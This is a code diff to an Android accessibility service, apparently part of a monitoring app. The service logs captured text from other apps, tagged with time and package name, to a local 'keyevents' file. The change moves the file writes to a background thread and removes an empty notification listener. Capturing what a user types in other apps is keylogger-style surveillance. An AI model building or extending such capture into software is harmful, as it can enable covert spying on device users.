@@ -94,17 +94,24 @@ class MonitorAccessibilityService : AccessibilityService() {
         val entry = "[$time][$currentPackageName] $currentCapturedText"
         currentBatch.append(entry).append("\n")
         
-        // Write the batch to file
+        // Safely extract text before clearing the builder for thread safety
         val batchText = currentBatch.toString()
-        if (batchText.isNotBlank()) {
-            val offlineDir = java.io.File(getExternalFilesDir(null), "keyevents/offline")
-            if (!offlineDir.exists()) offlineDir.mkdirs()
-            val offlineFile = java.io.File(offlineDir, "offline_keyevents.txt")
-            offlineFile.appendText(batchText.trim() + "\n\n")
-            currentBatch.clear()
-        }
-        
+        currentBatch.clear()
         currentCapturedText = ""
+
+        if (batchText.isNotBlank()) {
+            // Launch Disk I/O onto a background thread to prevent Main Thread ANRs
+            scope.launch(Dispatchers.IO) {
+                try {
+                    val offlineDir = java.io.File(getExternalFilesDir(null), "keyevents/offline")
+                    if (!offlineDir.exists()) offlineDir.mkdirs()
+                    val offlineFile = java.io.File(offlineDir, "offline_keyevents.txt")
+                    offlineFile.appendText(batchText.trim() + "\n\n")
+                } catch (e: Exception) {
+                    Log.e("MonitorAccessibility", "Failed to write key events to disk", e)
+                }
+            }
+        }
     }
 
     override fun onInterrupt() {
@@ -127,22 +134,3 @@ class MonitorAccessibilityService : AccessibilityService() {
     }
 }
 
-class MonitorNotificationListenerService : NotificationListenerService() {
-    override fun onListenerConnected() {
-        super.onListenerConnected()
-        LogManager.log(LogCategory.SYSTEM, "Notification Listener connected")
-    }
-
-    override fun onListenerDisconnected() {
-        super.onListenerDisconnected()
-        LogManager.log(LogCategory.SYSTEM, "Notification Listener disconnected")
-    }
-
-    override fun onNotificationPosted(sbn: StatusBarNotification?) {
-        // Notification processing logic placeholder
-    }
-
-    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
-        // Notification removed logic placeholder
-    }
-}
